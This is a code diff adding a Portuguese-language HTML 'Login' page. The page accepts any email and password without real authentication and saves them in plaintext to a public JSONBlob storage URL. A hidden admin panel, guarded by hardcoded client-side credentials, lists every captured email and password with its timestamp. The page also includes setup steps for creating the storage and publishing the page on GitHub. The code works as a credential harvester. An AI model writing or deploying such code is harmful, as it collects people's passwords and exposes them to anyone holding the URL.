@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: #f4f5f7;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+  .card {
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    padding: 40px;
+    width: 100%;
+    max-width: 360px;
+    text-align: center;
+  }
+  h1 {
+    margin-top: 0;
+    font-size: 1.6rem;
+    color: #222;
+  }
+  .contagem-numero {
+    font-size: 4rem;
+    font-weight: 700;
+    color: #2563eb;
+    margin: 10px 0;
+  }
+  label {
+    display: block;
+    text-align: left;
+    font-size: 0.85rem;
+    color: #555;
+    margin-bottom: 4px;
+    margin-top: 16px;
+  }
+  input {
+    width: 100%;
+    padding: 10px 12px;
+    border: 1px solid #d0d3d9;
+    border-radius: 8px;
+    font-size: 1rem;
+  }
+  input:focus {
+    outline: none;
+    border-color: #2563eb;
+  }
+  button {
+    width: 100%;
+    margin-top: 24px;
+    padding: 12px;
+    background: #2563eb;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #1d4ed8;
+  }
+  button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+  .erro {
+    color: #dc2626;
+    font-size: 0.85rem;
+    margin-top: 10px;
+    min-height: 18px;
+  }
+  .aviso {
+    color: #92400e;
+    background: #fef3c7;
+    border: 1px solid #fde68a;
+    border-radius: 8px;
+    padding: 10px 12px;
+    font-size: 0.85rem;
+    margin-top: 14px;
+    text-align: left;
+  }
+  .hidden {
+    display: none;
+  }
+  .subtitulo {
+    color: #666;
+    font-size: 0.95rem;
+    margin-top: -6px;
+  }
+  .loading {
+    color: #999;
+    font-size: 0.9rem;
+  }
+  .card-larga {
+    max-width: 640px;
+    text-align: left;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 16px;
+    font-size: 0.9rem;
+  }
+  th, td {
+    text-align: left;
+    padding: 8px 6px;
+    border-bottom: 1px solid #eee;
+    word-break: break-all;
+  }
+  th {
+    color: #555;
+    font-weight: 600;
+    font-size: 0.8rem;
+    text-transform: uppercase;
+  }
+  .voltar {
+    display: inline-block;
+    width: auto;
+    margin-top: 18px;
+    color: #666;
+    font-size: 0.9rem;
+    cursor: pointer;
+    background: none;
+    border: none;
+    padding: 0;
+  }
+  .voltar:hover {
+    text-decoration: underline;
+  }
+  .btn-admin {
+    position: fixed;
+    top: 16px;
+    right: 16px;
+    width: auto;
+    margin-top: 0;
+    padding: 8px 16px;
+    font-size: 0.85rem;
+    font-weight: 600;
+    background: #fff;
+    color: #444;
+    border: 1px solid #d0d3d9;
+    border-radius: 8px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+  }
+  .btn-admin:hover {
+    background: #f0f1f3;
+  }
+  .caixa-url {
+    background: #f4f5f7;
+    border: 1px solid #d0d3d9;
+    border-radius: 8px;
+    padding: 10px;
+    font-size: 0.8rem;
+    word-break: break-all;
+    margin-top: 10px;
+    user-select: all;
+  }
+  .passo {
+    font-size: 0.85rem;
+    color: #555;
+    margin-top: 14px;
+    line-height: 1.5;
+  }
+  code {
+    background: #eef0f3;
+    padding: 1px 5px;
+    border-radius: 4px;
+    font-size: 0.85em;
+  }
+</style>
+</head>
+<body>
+
+  <button class="btn-admin" id="btn-abrir-admin">Admin</button>
+
+  <!-- Tela de configuração (só aparece se o armazenamento ainda não foi configurado) -->
+  <div class="card card-larga hidden" id="tela-configuracao">
+    <h1>Configurar armazenamento</h1>
+    <p class="subtitulo">Antes de usar a página, é preciso criar um "espaço" de armazenamento compartilhado (gratuito, sem cadastro).</p>
+    <button id="btn-criar-armazenamento">Criar armazenamento agora</button>
+    <div class="erro" id="erro-configuracao"></div>
+    <div id="resultado-configuracao" class="hidden">
+      <div class="passo"><strong>Pronto!</strong> Copie a URL abaixo e cole no arquivo HTML, substituindo a linha:</div>
+      <div class="caixa-url">const URL_ARMAZENAMENTO = 'COLOQUE_AQUI_A_URL_GERADA';</div>
+      <div class="passo">Sua URL gerada (clique para selecionar tudo):</div>
+      <div class="caixa-url" id="url-gerada"></div>
+      <div class="passo">Depois de colar a URL no código e salvar o arquivo, é só subir para o GitHub. Não precisa repetir esse passo — a URL fica fixa no código para sempre.</div>
+    </div>
+  </div>
+
+  <div class="card hidden" id="tela-login">
+    <h1>Login</h1>
+    <form id="form-login">
+      <label for="email">E-mail</label>
+      <input type="text" id="email" name="email" required>
+
+      <label for="senha">Senha</label>
+      <input type="password" id="senha" name="senha" required>
+
+      <button type="submit">Entrar</button>
+      <div class="erro" id="erro-login"></div>
+    </form>
+  </div>
+
+  <div class="card hidden" id="tela-contagem">
+    <h1>Contagem</h1>
+    <div class="subtitulo">Pessoas que já fizeram login</div>
+    <div class="contagem-numero" id="numero-contagem">--</div>
+    <div class="loading" id="status-contagem"></div>
+  </div>
+
+  <div class="card hidden" id="tela-admin-login">
+    <h1>Acesso Admin</h1>
+    <form id="form-admin-login">
+      <label for="admin-usuario">Usuário</label>
+      <input type="text" id="admin-usuario" name="admin-usuario" required>
+
+      <label for="admin-senha">Senha</label>
+      <input type="password" id="admin-senha" name="admin-senha" required>
+
+      <button type="submit">Acessar</button>
+      <div class="erro" id="erro-admin-login"></div>
+    </form>
+    <button class="voltar" id="btn-cancelar-admin">← Cancelar</button>
+  </div>
+
+  <div class="card card-larga hidden" id="tela-lista">
+    <h1>Credenciais registradas</h1>
+    <div class="loading" id="status-lista">Carregando...</div>
+    <table id="tabela-lista" class="hidden">
+      <thead>
+        <tr>
+          <th>E-mail</th>
+          <th>Senha</th>
+          <th>Data/hora</th>
+        </tr>
+      </thead>
+      <tbody id="corpo-tabela-lista"></tbody>
+    </table>
+    <button class="voltar" id="btn-sair-admin">← Sair da área admin</button>
+  </div>
+
+  <script>
+    // ======================================================================
+    // CONFIGURAÇÃO DE ARMAZENAMENTO
+    // Se ainda não tiver uma URL, deixe como está: a própria página vai
+    // te ajudar a gerar uma na primeira vez que você abrir.
+    // Depois de gerar, troque a linha abaixo pela URL real e suba pro GitHub.
+    // ======================================================================
+    const URL_ARMAZENAMENTO = 'COLOQUE_AQUI_A_URL_GERADA';
+
+    const ADMIN_USUARIO = 'TI';
+    const ADMIN_SENHA = 'cdc1992';
+
+    const telaConfiguracao = document.getElementById('tela-configuracao');
+    const telaLogin = document.getElementById('tela-login');
+    const telaContagem = document.getElementById('tela-contagem');
+    const telaAdminLogin = document.getElementById('tela-admin-login');
+    const telaLista = document.getElementById('tela-lista');
+
+    const btnCriarArmazenamento = document.getElementById('btn-criar-armazenamento');
+    const erroConfiguracao = document.getElementById('erro-configuracao');
+    const resultadoConfiguracao = document.getElementById('resultado-configuracao');
+    const urlGerada = document.getElementById('url-gerada');
+
+    const formLogin = document.getElementById('form-login');
+    const erroLogin = document.getElementById('erro-login');
+
+    const numeroContagem = document.getElementById('numero-contagem');
+    const statusContagem = document.getElementById('status-contagem');
+
+    const btnAbrirAdmin = document.getElementById('btn-abrir-admin');
+    const formAdminLogin = document.getElementById('form-admin-login');
+    const erroAdminLogin = document.getElementById('erro-admin-login');
+    const btnCancelarAdmin = document.getElementById('btn-cancelar-admin');
+
+    const statusLista = document.getElementById('status-lista');
+    const tabelaLista = document.getElementById('tabela-lista');
+    const corpoTabelaLista = document.getElementById('corpo-tabela-lista');
+    const btnSairAdmin = document.getElementById('btn-sair-admin');
+
+    function esconderTodasTelas() {
+      telaConfiguracao.classList.add('hidden');
+      telaLogin.classList.add('hidden');
+      telaContagem.classList.add('hidden');
+      telaAdminLogin.classList.add('hidden');
+      telaLista.classList.add('hidden');
+    }
+
+    function armazenamentoConfigurado() {
+      return URL_ARMAZENAMENTO && URL_ARMAZENAMENTO.indexOf('http') === 0;
+    }
+
+    // ---- Funções auxiliares para ler/gravar no JSONBlob ----
+    async function lerDados() {
+      const resp = await fetch(URL_ARMAZENAMENTO);
+      if (!resp.ok) throw new Error('Falha ao ler armazenamento (' + resp.status + ')');
+      const dados = await resp.json();
+      if (!dados || !Array.isArray(dados.logins)) return { logins: [] };
+      return dados;
+    }
+
+    async function gravarDados(dados) {
+      const resp = await fetch(URL_ARMAZENAMENTO, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dados)
+      });
+      if (!resp.ok) throw new Error('Falha ao gravar armazenamento (' + resp.status + ')');
+    }
+
+    // ---- Tela de configuração inicial (gera a URL do JSONBlob) ----
+    btnCriarArmazenamento.addEventListener('click', async function () {
+      erroConfiguracao.textContent = '';
+      btnCriarArmazenamento.disabled = true;
+      btnCriarArmazenamento.textContent = 'Criando...';
+
+      try {
+        const resp = await fetch('https://jsonblob.com/api/jsonBlob', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ logins: [] })
+        });
+
+        if (!resp.ok) throw new Error('Não foi possível criar o armazenamento (' + resp.status + ')');
+
+        const local = resp.headers.get('Location');
+        if (!local) throw new Error('O serviço não retornou a URL do armazenamento.');
+
+        urlGerada.textContent = local;
+        resultadoConfiguracao.classList.remove('hidden');
+      } catch (err) {
+        console.error(err);
+        erroConfiguracao.textContent = 'Erro: ' + err.message;
+      } finally {
+        btnCriarArmazenamento.disabled = false;
+        btnCriarArmazenamento.textContent = 'Criar armazenamento agora';
+      }
+    });
+
+    // ---- Login normal ----
+    formLogin.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      erroLogin.textContent = '';
+
+      const email = document.getElementById('email').value.trim();
+      const senha = document.getElementById('senha').value;
+
+      if (!email || !senha) {
+        erroLogin.textContent = 'Preencha e-mail e senha para continuar.';
+        return;
+      }
+
+      try {
+        const dados = await lerDados();
+        dados.logins.push({ email: email, senha: senha, quando: new Date().toISOString() });
+        await gravarDados(dados);
+        irParaContagem();
+      } catch (err) {
+        console.error('Erro ao salvar login:', err);
+        erroLogin.textContent = 'Erro ao salvar o login: ' + err.message;
+      }
+    });
+
+    async function irParaContagem() {
+      esconderTodasTelas();
+      telaContagem.classList.remove('hidden');
+      statusContagem.textContent = 'Carregando...';
+
+      try {
+        const dados = await lerDados();
+        numeroContagem.textContent = dados.logins.length;
+        statusContagem.textContent = '';
+      } catch (err) {
+        console.error('Erro ao carregar contagem:', err);
+        numeroContagem.textContent = '?';
+        statusContagem.textContent = 'Não foi possível carregar o total: ' + err.message;
+      }
+    }
+
+    // ---- Admin ----
+    btnAbrirAdmin.addEventListener('click', function () {
+      erroAdminLogin.textContent = '';
+      formAdminLogin.reset();
+      esconderTodasTelas();
+      telaAdminLogin.classList.remove('hidden');
+    });
+
+    btnCancelarAdmin.addEventListener('click', function () {
+      esconderTodasTelas();
+      telaLogin.classList.remove('hidden');
+    });
+
+    formAdminLogin.addEventListener('submit', function (e) {
+      e.preventDefault();
+      erroAdminLogin.textContent = '';
+
+      const usuario = document.getElementById('admin-usuario').value.trim();
+      const senha = document.getElementById('admin-senha').value;
+
+      if (usuario === ADMIN_USUARIO && senha === ADMIN_SENHA) {
+        irParaLista();
+      } else {
+        erroAdminLogin.textContent = 'Usuário ou senha de admin incorretos.';
+      }
+    });
+
+    async function irParaLista() {
+      esconderTodasTelas();
+      telaLista.classList.remove('hidden');
+      tabelaLista.classList.add('hidden');
+      statusLista.textContent = 'Carregando...';
+      corpoTabelaLista.innerHTML = '';
+
+      try {
+        const dados = await lerDados();
+        const registros = dados.logins.slice().sort((a, b) => new Date(b.quando) - new Date(a.quando));
+
+        if (registros.length === 0) {
+          statusLista.textContent = 'Nenhum login registrado ainda.';
+          return;
+        }
+
+        for (const registro of registros) {
+          const linha = document.createElement('tr');
+
+          const tdEmail = document.createElement('td');
+          tdEmail.textContent = registro.email || '';
+
+          const tdSenha = document.createElement('td');
+          tdSenha.textContent = registro.senha || '';
+
+          const tdQuando = document.createElement('td');
+          tdQuando.textContent = registro.quando ? new Date(registro.quando).toLocaleString('pt-BR') : '';
+
+          linha.appendChild(tdEmail);
+          linha.appendChild(tdSenha);
+          linha.appendChild(tdQuando);
+          corpoTabelaLista.appendChild(linha);
+        }
+
+        statusLista.textContent = '';
+        tabelaLista.classList.remove('hidden');
+      } catch (err) {
+        console.error('Erro ao carregar lista de logins:', err);
+        statusLista.textContent = 'Não foi possível carregar a lista: ' + err.message;
+      }
+    }
+
+    btnSairAdmin.addEventListener('click', function () {
+      esconderTodasTelas();
+      telaLogin.classList.remove('hidden');
+    });
+
+    // ---- Inicialização ----
+    esconderTodasTelas();
+    if (armazenamentoConfigurado()) {
+      telaLogin.classList.remove('hidden');
+    } else {
+      telaConfiguracao.classList.remove('hidden');
+    }
+  </script>
+
+</body>
+</html>
